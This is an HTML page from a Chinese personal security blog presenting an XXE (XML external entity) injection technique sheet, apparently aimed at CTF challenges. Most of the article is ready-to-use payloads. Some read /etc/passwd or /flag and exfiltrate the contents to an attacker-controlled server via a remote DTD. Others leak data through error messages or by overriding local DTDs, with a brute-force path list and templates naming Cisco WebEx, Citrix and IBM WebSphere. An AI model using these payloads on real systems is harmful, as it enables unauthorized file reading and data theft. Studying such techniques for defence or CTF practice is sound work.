@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>XXE-姿势 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, XXE' />
+  <meta itemprop="name" content="XXE-姿势">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="389">
+  <meta itemprop="keywords" content="OWASP,XXE"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/xxe/128/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="XXE-姿势">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="XXE">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="XXE-姿势">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/xxe/128/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/xxe/127/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "XXE-姿势",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/xxe\/128\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, XXE","wordcount":  389 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/xxe\/128\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">XXE-姿势</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>XXE-姿势</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="389 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>链接：</p>
+<p><a href="https://www.bilibili.com/video/BV1at41177SA?spm_id_from=333.337.search-card.all.click&amp;vd_source=dc04d88ab964b9a81d6d774552d69d75"target="_blank" rel="external nofollow noopener noreferrer">视频</a></p>
+<p><a href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"target="_blank" rel="external nofollow noopener noreferrer">文章</a></p>
+<p>注意：内层的定义的参数实体<code>%</code> 需要进行HTML转义，否则会出现解析错误。</p>
+<h5 id="json" class="heading-element"><span>0.0.0.1  json</span>
+  <a href="#json" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>很多有json的地方存在xxe注入，比如下面这样</p>
+<!-- raw HTML omitted -->
+<p>可以尝试改成xml形式</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101717327.webp" alt="image-20230410171716122" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101717327.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101717327.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101717327.webp?size=large 2x" data-title="image-20230410171716122" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h5 id="数据外带" class="heading-element"><span>0.0.0.2  数据外带</span>
+  <a href="#%e6%95%b0%e6%8d%ae%e5%a4%96%e5%b8%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>xxe没有回显，可以想办法把数据带到我们的vps上</p>
+<p>==一：==</p>
+<!-- raw HTML omitted -->
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;  
+    &lt;!ENTITY % start &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&#34;&gt;
+    %start;
+    %send;
+]&gt;</code></pre><p>==二：==</p>
+<p>但是上面的一在内部实体中用了参数实体，</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % start &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&#34;&gt;</code></pre><p>很多网站都是禁止这么使用的，那么我们就可以远程定义一个自己的dtd</p>
+<p>payload</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % remote SYSTEM &#34;http://myip/fuck.dtd&#34;&gt;  
+    &lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///flag&#34;&gt;
+    %remote;
+    %send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;</code></pre><p>fuck.dtd</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % start &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip:10001/?%file;&#39;&gt;&#34;&gt;
+%start;</code></pre><h5 id="本地dtd" class="heading-element"><span>0.0.0.3  本地DTD</span>
+  <a href="#%e6%9c%ac%e5%9c%b0dtd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？</p>
+<p>所有 XML 实体都是常量。如果定义两个具有相同名称的实体，则只会使用第一个实体。这里相当于对本地的dtd进行重写</p>
+<p>爆破一下常见本地dtd路径</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">./properties/schemas/j2ee/XMLSchema.dtd
+./../properties/schemas/j2ee/XMLSchema.dtd
+./../../properties/schemas/j2ee/XMLSchema.dtd
+/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
+/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
+/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
+/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
+/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
+/usr/share/yelp/dtd/docbookx.dtd
+/usr/share/xml/fontconfig/fonts.dtd
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
+/usr/share/boostbook/dtd/1.1/boostbook.dtd
+/usr/share/boostbook/dtd/boostbook.dtd
+/usr/share/dblatex/schema/dblatex-config.dtd
+/usr/share/struts/struts-config_1_0.dtd
+/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd</code></pre><pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">Linux
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
+%local_dtd;
+
+Windows
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///C:WindowsSystem32wbemxmlcim20.dtd&#34;&gt;
+&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &#34;test&#34;&#39;&gt;
+%local_dtd;
+
+
+Cisco WebEx
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&#34;&gt;
+&lt;!ENTITY % url.attribute.set &#39;&gt;Your DTD code&lt;!ENTITY test &#34;test&#34;&#39;&gt;
+%local_dtd;
+
+Citrix XenMobile Server
+&lt;!ENTITY % local_dtd SYSTEM &#34;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&#34;&gt;
+&lt;!ENTITY % Body &#39;&gt;Your DTD code&lt;!ENTITY test &#34;test&#34;&#39;&gt;
+%local_dtd;
+
+多平台 IBM WebSphere 应用
+&lt;!ENTITY % local_dtd SYSTEM &#34;./../../properties/schemas/j2ee/XMLSchema.dtd&#34;&gt;
+&lt;!ENTITY % xs-datatypes &#39;Your DTD code&#39;&gt;
+&lt;!ENTITY % simpleType &#34;a&#34;&gt;
+&lt;!ENTITY % restriction &#34;b&#34;&gt;
+&lt;!ENTITY % boolean &#34;(c)&#34;&gt;
+&lt;!ENTITY % URIref &#34;CDATA&#34;&gt;
+&lt;!ENTITY % XPathExpr &#34;CDATA&#34;&gt;
+&lt;!ENTITY % QName &#34;NMTOKEN&#34;&gt;
+&lt;!ENTITY % NCName &#34;NMTOKEN&#34;&gt;
+&lt;!ENTITY % nonNegativeInteger &#34;NMTOKEN&#34;&gt;
+%local_dtd;</code></pre><p>实例</p>
+<p>假设第一次读取**/flag<strong>实体，第二次把</strong>/flag的里的值<strong>当做实体来读取，明显</strong>/flag的里的值**这个实体不存在，然后就会报错返回，这样就拿到flag了。</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
+%local_dtd;</code></pre><p>poc</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message[
+    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+    &lt;!ENTITY % ISOamso &#39;
+    &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///flag&#34;&gt;
+    &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+&#39;&gt;
+%local_dtd;
+]&gt;</code></pre><p><strong>ps: 其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的<code>%</code>编码，第三层就需要在第二层的基础上将所有<code>%</code>、<code>&amp;</code>、<code>'</code>、<code>&quot;</code> html编码。</strong></p>
+<p>&amp;  &amp;#x26;</p>
+<p>%  &amp;#x25;</p>
+<p>&rsquo;  &amp;#x27;</p>
+<p>直观来看</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message[
+    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+    &lt;!ENTITY % ISOamso &#39;
+    &lt;!ENTITY % file SYSTEM &#34;file:///flag&#34;&gt;
+    &lt;!ENTITY % eval &#34;  &lt;!ENTITY % error SYSTEM &#39;file:///aaaaa/%file;&#39;&gt;  &#34;&gt;
+    %eval;
+    %error;
+&#39;&gt;
+%local_dtd;
+]&gt;</code></pre><h5 id="报错" class="heading-element"><span>0.0.0.4  报错</span>
+  <a href="#%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
+<p>payload</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % remote SYSTEM &#34;http://my-ip/fuck.dtd&#34;&gt;
+    &lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///flag&#34;&gt;
+    %remote;
+    %send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;</code></pre><p>fuck.dtd</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % start &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:///hhhhhhh/%file;&#39;&gt;&#34;&gt;
+%start;</code></pre><p>本地dtd+报错连用：</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message[
+    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+    &lt;!ENTITY % ISOamso &#39;
+    &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///flag&#34;&gt;
+    &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+&#39;&gt;
+%local_dtd;
+]&gt;</code></pre><h5 id="other" class="heading-element"><span>0.0.0.5  other</span>
+  <a href="#other" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2 2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的</p>
+<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ELEMENT message ANY&gt;
+    &lt;!ENTITY % para1 SYSTEM &#34;file:///flag&#34;&gt;
+    &lt;!ENTITY % para &#39;
+        &lt;!ENTITY &amp;#x25; para2 &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&#34;&gt;
+        &amp;#x25;para2;
+    &#39;&gt;
+    %para;
+]&gt;
+&lt;message&gt;10&lt;/message&gt;</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/xxe/" class="post-tag" title="Tags - XXE">XXE</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/" class="post-nav-item" rel="prev" title="代码执行|命令执行"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>代码执行|命令执行</a>
+      <a href="/posts/owasp/xxe/127/" class="post-nav-item" rel="next" title="XXE-基础">XXE-基础<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
